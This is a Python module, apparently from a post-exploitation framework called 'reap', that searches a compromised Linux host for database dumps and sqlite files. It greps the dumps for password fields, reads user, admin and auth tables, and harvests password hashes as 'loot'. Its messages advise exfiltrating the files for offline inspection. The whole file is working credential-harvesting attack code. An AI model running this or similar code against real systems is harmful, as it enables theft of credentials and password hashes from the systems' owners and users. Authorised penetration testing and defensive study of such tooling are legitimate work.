"""Database artifacts at rest: .sql/.sql.gz dumps and sqlite files, which often
hold the next credential or password hash. reap tests DB *services* for reuse but
never looted the DB *files* — this closes that gap. Recovered hashes are emitted
as loot (kind='hash'); v1 surfaces hashes without cracking.
"""
from __future__ import annotations

import re
import shlex

from ...models import Credential, Finding
from ...patterns import looks_like_hash, scan_line
from ..base import Module, register

_FIND = ("find /home /var/www /srv /opt /app /var/backups /tmp -type f "
         r"\( -name '*.sql' -o -name '*.sql.gz' -o -name '*.db' "
         r"-o -name '*.sqlite' -o -name '*.sqlite3' \) -size -50M "
         "2>/dev/null | head -n 40")
_TOKEN = re.compile(r"[A-Za-z0-9./$+=]{16,}")
_USER_TBL = re.compile(r"(?i)user|account|admin|cred|auth|member")


@register
class DbArtifacts(Module):
    name = "db_artifacts"

    def triggers(self, ctx) -> bool:
        return ctx.os in ("linux", "unknown")

    def collect(self, session):
        findings = []
        for line in session.exec(_FIND, timeout=60).stdout.splitlines():
            path = line.strip()
            if not path:
                continue
            findings.append(Finding(
                type="info", severity="medium", title=f"DB artifact: {path}",
                detail="database dump / sqlite file — exfil & inspect offline",
                source_module=self.name))
            if path.endswith(".sql"):
                findings += self._scan_sql(session, path)
            elif path.endswith((".sqlite", ".sqlite3", ".db")):
                findings += self._scan_sqlite(session, path)
        return findings

    def _hashes(self, line, source):
        out = []
        for tok in _TOKEN.findall(line):
            ht = looks_like_hash(tok)
            if ht:
                out.append(Finding(
                    type="credential", severity="medium",
                    title=f"Hash in {source.rsplit('/', 1)[-1]} ({ht})",
                    detail=f"{ht} hash recovered from {source}", source_module=self.name,
                    credential=Credential(kind="hash", secret=tok, source=source,
                                          metadata={"hash_type": ht})))
        return out

    def _scan_sql(self, session, path):
        out = []
        cmd = (f"grep -iaE 'insert into|password|passwd|pwd|hash' {shlex.quote(path)} "
               "2>/dev/null | head -n 80")
        for line in session.exec(cmd, timeout=30).stdout.splitlines():
            for f in scan_line(line, path):
                f.source_module = self.name
                out.append(f)
            out += self._hashes(line, path)
        return out

    def _scan_sqlite(self, session, path):
        has = session.exec("command -v sqlite3 >/dev/null 2>&1 && echo yes",
                           timeout=10).out.strip()
        if has != "yes":
            return [Finding(
                type="info", severity="medium", title=f"SQLite DB present: {path}",
                detail="no sqlite3 on host — pull the file and open it offline",
                source_module=self.name)]
        out = []
        tables = session.exec(f"sqlite3 {shlex.quote(path)} .tables 2>/dev/null",
                             timeout=20).stdout
        for tbl in tables.split():
            if not _USER_TBL.search(tbl):
                continue
            dump = session.exec(
                f"sqlite3 {shlex.quote(path)} 'SELECT * FROM {tbl} LIMIT 50' 2>/dev/null",
                timeout=20).stdout
            for line in dump.splitlines():
                for f in scan_line(line, f"{path}:{tbl}"):
                    f.source_module = self.name
                    out.append(f)
                out += self._hashes(line, f"{path}:{tbl}")
        return out
